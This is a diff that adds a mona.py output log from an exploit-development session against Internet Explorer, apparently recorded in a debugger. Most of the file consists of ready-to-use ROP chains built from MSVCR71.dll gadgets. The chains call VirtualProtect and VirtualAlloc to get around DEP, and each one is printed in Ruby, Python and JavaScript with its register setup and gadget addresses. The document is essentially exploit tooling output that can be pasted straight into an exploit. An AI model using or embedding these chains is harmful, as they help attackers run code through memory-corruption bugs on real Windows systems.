@@ -1,0 +1,313 @@
+          
+          ---------- Mona command started on 2016-09-24 22:05:29 (v2.0, rev 427) ----------
+0BADF00D  [+] Processing arguments and criteria
+0BADF00D      - Pointer access level : X
+0BADF00D      - Only querying modules msvcr71.dll
+0BADF00D  [+] Generating module info table, hang on...
+0BADF00D      - Processing modules
+0BADF00D      - Done. Let's rock 'n roll.
+0BADF00D  [+] Preparing output file '_rop_progress_iexplore.exe_732.log'
+0BADF00D      - (Re)setting logfile _rop_progress_iexplore.exe_732.log
+0BADF00D  [+] Progress will be written to _rop_progress_iexplore.exe_732.log
+0BADF00D  [+] Maximum offset : 40
+0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
+0BADF00D  [+] Max nr of instructions : 6
+0BADF00D  [+] Split output into module rop files ? False
+0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
+0BADF00D      - Querying module MSVCR71.dll
+0BADF00D      - Search complete :
+0BADF00D         Ending : RETN 0x0C, Nr found : 2
+0BADF00D         Ending : RETN, Nr found : 2427
+0BADF00D         Ending : RETN 0x08, Nr found : 24
+0BADF00D         Ending : RETN 0x02, Nr found : 2
+0BADF00D         Ending : RETN 0x10, Nr found : 11
+0BADF00D         Ending : RETN 0x00, Nr found : 12
+0BADF00D         Ending : RETN 0x06, Nr found : 1
+0BADF00D         Ending : RETN 0x14, Nr found : 2
+0BADF00D         Ending : RETN 0x04, Nr found : 62
+0BADF00D      - Filtering and mutating 2543 gadgets
+0BADF00D        - Progress update : 500 / 2543 items processed (Sat 2016/09/24 10:05:32 PM) - (19%)
+0BADF00D        - Progress update : 1000 / 2543 items processed (Sat 2016/09/24 10:05:33 PM) - (39%)
+0BADF00D        - Progress update : 1500 / 2543 items processed (Sat 2016/09/24 10:05:35 PM) - (58%)
+0BADF00D        - Progress update : 2000 / 2543 items processed (Sat 2016/09/24 10:05:37 PM) - (78%)
+0BADF00D        - Progress update : 2500 / 2543 items processed (Sat 2016/09/24 10:05:39 PM) - (98%)
+0BADF00D        - Progress update : 2543 / 2543 items processed (Sat 2016/09/24 10:05:39 PM) - (100%)
+0BADF00D  [+] Creating suggestions list
+0BADF00D  [+] Processing suggestions
+0BADF00D  [+] Launching ROP generator
+0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
+0BADF00D      Enumerating ROPFunc info
+0BADF00D  [+] Searching from 0x7c340000 to 0x7c396000
+0BADF00D  [+] Preparing output file 'MSVCR71_virtualprotect.xml'
+0BADF00D      - (Re)setting logfile MSVCR71_virtualprotect.xml
+0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
+0BADF00D      Enumerating ROPFunc info
+0BADF00D  [+] Searching from 0x7c340000 to 0x7c396000
+0BADF00D  [+] Preparing output file 'MSVCR71_virtualalloc.xml'
+0BADF00D      - (Re)setting logfile MSVCR71_virtualalloc.xml
+0BADF00D  [+] Preparing output file 'rop_chains.txt'
+0BADF00D      - (Re)setting logfile rop_chains.txt
+0BADF00D  [+] ROP chains written to file rop_chains.txt
+          
+          ################################################################################
+          
+          Register setup for VirtualProtect() :
+          --------------------------------------------
+           EAX = NOP (0x90909090)
+           ECX = lpOldProtect (ptr to W address)
+           EDX = NewProtect (0x40)
+           EBX = dwSize
+           ESP = lPAddress (automatic)
+           EBP = ReturnTo (ptr to jmp esp)
+           ESI = ptr to VirtualProtect()
+           EDI = ROP NOP (RETN)
+           --- alternative chain ---
+           EAX = tr to &VirtualProtect()
+           ECX = lpOldProtect (ptr to W address)
+           EDX = NewProtect (0x40)
+           EBX = dwSize
+           ESP = lPAddress (automatic)
+           EBP = POP (skip 4 bytes)
+           ESI = ptr to JMP [EAX]
+           EDI = ROP NOP (RETN)
+           + place ptr to "jmp esp" on stack, below PUSHAD
+          --------------------------------------------
+          
+          
+          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
+          ----------------------------------------------------------
+          
+          *** [ Ruby ] ***
+          
+              def create_rop_chain()
+          
+                  # rop chain generated with mona.py - www.corelan.be
+                  rop_gadgets = 
+                  [
+                      0x7c357cff,    # POP EBP # RETN [MSVCR71.dll] 
+                      0x7c357cff,    # skip 4 bytes [MSVCR71.dll]
+                      0x7c36098d,    # POP EBX # RETN [MSVCR71.dll] 
+                      0x00000201,    # 0x00000201-> ebx
+                      0x7c3458e6,    # POP EDX # RETN [MSVCR71.dll] 
+                      0x00000040,    # 0x00000040-> edx
+                      0x7c354f23,    # POP ECX # RETN [MSVCR71.dll] 
+                      0x7c38eb06,    # &Writable location [MSVCR71.dll]
+                      0x7c342eae,    # POP EDI # RETN [MSVCR71.dll] 
+                      0x7c34d202,    # RETN (ROP NOP) [MSVCR71.dll]
+                      0x7c34aceb,    # POP ESI # RETN [MSVCR71.dll] 
+                      0x7c3415a2,    # JMP [EAX] [MSVCR71.dll]
+                      0x7c345194,    # POP EAX # RETN [MSVCR71.dll] 
+                      0x7c37a140,    # ptr to &VirtualProtect() [IAT MSVCR71.dll]
+                      0x7c378c81,    # PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                      0x7c345c30,    # ptr to 'push esp # ret ' [MSVCR71.dll]
+                  ].flatten.pack("V*")
+          
+                  return rop_gadgets
+          
+              end
+          
+          
+              # Call the ROP chain generator inside the 'exploit' function :
+          
+          
+              rop_chain = create_rop_chain()
+          
+          
+          
+          *** [ Python ] ***
+          
+              def create_rop_chain():
+          
+                  # rop chain generated with mona.py - www.corelan.be
+                  rop_gadgets = ""
+                  rop_gadgets += struct.pack('<L',0x7c357cff)    # POP EBP # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c357cff)    # skip 4 bytes [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c36098d)    # POP EBX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x00000201)    # 0x00000201-> ebx
+                  rop_gadgets += struct.pack('<L',0x7c3458e6)    # POP EDX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x00000040)    # 0x00000040-> edx
+                  rop_gadgets += struct.pack('<L',0x7c354f23)    # POP ECX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c38eb06)    # &Writable location [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c342eae)    # POP EDI # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c34d202)    # RETN (ROP NOP) [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c34aceb)    # POP ESI # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c3415a2)    # JMP [EAX] [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c345194)    # POP EAX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c37a140)    # ptr to &VirtualProtect() [IAT MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c378c81)    # PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c345c30)    # ptr to 'push esp # ret ' [MSVCR71.dll]
+                  return rop_gadgets
+          
+              rop_chain = create_rop_chain()
+          
+          
+          
+          *** [ JavaScript ] ***
+          
+              //rop chain generated with mona.py - www.corelan.be
+              rop_gadgets = unescape(
+                  "%u7cff%u7c35" + // 0x7c357cff : ,# POP EBP # RETN [MSVCR71.dll] 
+                  "%u7cff%u7c35" + // 0x7c357cff : ,# skip 4 bytes [MSVCR71.dll]
+                  "%u098d%u7c36" + // 0x7c36098d : ,# POP EBX # RETN [MSVCR71.dll] 
+                  "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
+                  "%u58e6%u7c34" + // 0x7c3458e6 : ,# POP EDX # RETN [MSVCR71.dll] 
+                  "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
+                  "%u4f23%u7c35" + // 0x7c354f23 : ,# POP ECX # RETN [MSVCR71.dll] 
+                  "%ueb06%u7c38" + // 0x7c38eb06 : ,# &Writable location [MSVCR71.dll]
+                  "%u2eae%u7c34" + // 0x7c342eae : ,# POP EDI # RETN [MSVCR71.dll] 
+                  "%ud202%u7c34" + // 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]
+                  "%uaceb%u7c34" + // 0x7c34aceb : ,# POP ESI # RETN [MSVCR71.dll] 
+                  "%u15a2%u7c34" + // 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]
+                  "%u5194%u7c34" + // 0x7c345194 : ,# POP EAX # RETN [MSVCR71.dll] 
+                  "%ua140%u7c37" + // 0x7c37a140 : ,# ptr to &VirtualProtect() [IAT MSVCR71.dll]
+                  "%u8c81%u7c37" + // 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                  "%u5c30%u7c34" + // 0x7c345c30 : ,# ptr to 'push esp # ret ' [MSVCR71.dll]
+                  ""); //  : 
+          
+          
+          --------------------------------------------------------------------------------------------------
+          
+          
+          ################################################################################
+          
+          Register setup for VirtualAlloc() :
+          --------------------------------------------
+           EAX = NOP (0x90909090)
+           ECX = flProtect (0x40)
+           EDX = flAllocationType (0x1000)
+           EBX = dwSize
+           ESP = lpAddress (automatic)
+           EBP = ReturnTo (ptr to jmp esp)
+           ESI = ptr to VirtualAlloc()
+           EDI = ROP NOP (RETN)
+           --- alternative chain ---
+           EAX = ptr to &VirtualAlloc()
+           ECX = flProtect (0x40)
+           EDX = flAllocationType (0x1000)
+           EBX = dwSize
+           ESP = lpAddress (automatic)
+           EBP = POP (skip 4 bytes)
+           ESI = ptr to JMP [EAX]
+           EDI = ROP NOP (RETN)
+           + place ptr to "jmp esp" on stack, below PUSHAD
+          --------------------------------------------
+          
+          
+          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
+          --------------------------------------------------------
+          
+          *** [ Ruby ] ***
+          
+              def create_rop_chain()
+          
+                  # rop chain generated with mona.py - www.corelan.be
+                  rop_gadgets = 
+                  [
+                      0x7c36f970,    # POP EBP # RETN [MSVCR71.dll] 
+                      0x7c36f970,    # skip 4 bytes [MSVCR71.dll]
+                      0x7c34280f,    # POP EBX # RETN [MSVCR71.dll] 
+                      0x00000001,    # 0x00000001-> ebx
+                      0x7c344f8e,    # POP EDX # RETN [MSVCR71.dll] 
+                      0x00001000,    # 0x00001000-> edx
+                      0x7c354ea7,    # POP ECX # RETN [MSVCR71.dll] 
+                      0x00000040,    # 0x00000040-> ecx
+                      0x7c342e9e,    # POP EDI # RETN [MSVCR71.dll] 
+                      0x7c34d202,    # RETN (ROP NOP) [MSVCR71.dll]
+                      0x7c34aceb,    # POP ESI # RETN [MSVCR71.dll] 
+                      0x7c3415a2,    # JMP [EAX] [MSVCR71.dll]
+                      0x7c344edc,    # POP EAX # RETN [MSVCR71.dll] 
+                      0x7c37a094,    # ptr to &VirtualAlloc() [IAT MSVCR71.dll]
+                      0x7c378c81,    # PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                      0x7c345c30,    # ptr to 'push esp # ret ' [MSVCR71.dll]
+                  ].flatten.pack("V*")
+          
+                  return rop_gadgets
+          
+              end
+          
+          
+              # Call the ROP chain generator inside the 'exploit' function :
+          
+          
+              rop_chain = create_rop_chain()
+          
+          
+          
+          *** [ Python ] ***
+          
+              def create_rop_chain():
+          
+                  # rop chain generated with mona.py - www.corelan.be
+                  rop_gadgets = ""
+                  rop_gadgets += struct.pack('<L',0x7c36f970)    # POP EBP # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c36f970)    # skip 4 bytes [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c34280f)    # POP EBX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x00000001)    # 0x00000001-> ebx
+                  rop_gadgets += struct.pack('<L',0x7c344f8e)    # POP EDX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x00001000)    # 0x00001000-> edx
+                  rop_gadgets += struct.pack('<L',0x7c354ea7)    # POP ECX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x00000040)    # 0x00000040-> ecx
+                  rop_gadgets += struct.pack('<L',0x7c342e9e)    # POP EDI # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c34d202)    # RETN (ROP NOP) [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c34aceb)    # POP ESI # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c3415a2)    # JMP [EAX] [MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c344edc)    # POP EAX # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c37a094)    # ptr to &VirtualAlloc() [IAT MSVCR71.dll]
+                  rop_gadgets += struct.pack('<L',0x7c378c81)    # PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                  rop_gadgets += struct.pack('<L',0x7c345c30)    # ptr to 'push esp # ret ' [MSVCR71.dll]
+                  return rop_gadgets
+          
+              rop_chain = create_rop_chain()
+          
+          
+          
+          *** [ JavaScript ] ***
+          
+              //rop chain generated with mona.py - www.corelan.be
+              rop_gadgets = unescape(
+                  "%uf970%u7c36" + // 0x7c36f970 : ,# POP EBP # RETN [MSVCR71.dll] 
+                  "%uf970%u7c36" + // 0x7c36f970 : ,# skip 4 bytes [MSVCR71.dll]
+                  "%u280f%u7c34" + // 0x7c34280f : ,# POP EBX # RETN [MSVCR71.dll] 
+                  "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
+                  "%u4f8e%u7c34" + // 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll] 
+                  "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
+                  "%u4ea7%u7c35" + // 0x7c354ea7 : ,# POP ECX # RETN [MSVCR71.dll] 
+                  "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
+                  "%u2e9e%u7c34" + // 0x7c342e9e : ,# POP EDI # RETN [MSVCR71.dll] 
+                  "%ud202%u7c34" + // 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]
+                  "%uaceb%u7c34" + // 0x7c34aceb : ,# POP ESI # RETN [MSVCR71.dll] 
+                  "%u15a2%u7c34" + // 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]
+                  "%u4edc%u7c34" + // 0x7c344edc : ,# POP EAX # RETN [MSVCR71.dll] 
+                  "%ua094%u7c37" + // 0x7c37a094 : ,# ptr to &VirtualAlloc() [IAT MSVCR71.dll]
+                  "%u8c81%u7c37" + // 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
+                  "%u5c30%u7c34" + // 0x7c345c30 : ,# ptr to 'push esp # ret ' [MSVCR71.dll]
+                  ""); //  : 
+          
+          
+          --------------------------------------------------------------------------------------------------
+          
+          
+0BADF00D      ROP generator finished
+0BADF00D  
+0BADF00D  [+] Preparing output file 'stackpivot.txt'
+0BADF00D      - (Re)setting logfile stackpivot.txt
+0BADF00D  [+] Writing stackpivots to file stackpivot.txt
+0BADF00D      Wrote 768 pivots to file 
+0BADF00D  [+] Preparing output file 'rop_suggestions.txt'
+0BADF00D      - (Re)setting logfile rop_suggestions.txt
+0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
+0BADF00D      Wrote 530 suggestions to file
+0BADF00D  [+] Preparing output file 'rop.txt'
+0BADF00D      - (Re)setting logfile rop.txt
+0BADF00D  [+] Writing results to file rop.txt (2960 interesting gadgets)
+0BADF00D      Wrote 2960 interesting gadgets to file
+0BADF00D  [+] Writing other gadgets to file rop.txt (3146 gadgets)
+0BADF00D      Wrote 3146 other gadgets to file
+0BADF00D  Done
+0BADF00D  
+          [+] This mona.py action took 0:00:17.425000
+          
+          [22:06:05] Thread 000008FC terminated, exit code 0
+          Log file closed
+
+
